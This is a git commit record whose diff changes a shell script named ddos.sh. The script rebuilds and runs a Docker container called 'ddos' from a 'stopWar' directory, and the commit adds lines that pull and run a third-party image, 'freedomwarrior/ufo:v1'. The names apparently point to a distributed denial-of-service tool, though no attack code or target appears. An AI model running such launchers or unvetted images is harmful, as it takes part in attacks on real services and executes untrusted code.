12a995c4a8d19adceade931260d0b5e7b64f4c80
Andrew G Sorokin <angello@elm.dp.ua>
2022-03-01 16:14:04 +0200

    add freedom

--- ddos.sh
+++ ddos.sh
@@ -5,3 +5,8 @@
 /usr/bin/docker rmi ddos
 cd /root/stopWar && /usr/bin/docker build -t ddos . && /usr/bin/docker run --rm -d --name ddos ddos 
 #&& docker logs -f ddos
+
+/usr/bin/docker stop ufo
+/usr/bin/docker rm -f ufo
+/usr/bin/docker rmi freedomwarrior/ufo:v1
+/usr/bin/docker run -d --rm --name ufo freedomwarrior/ufo:v1
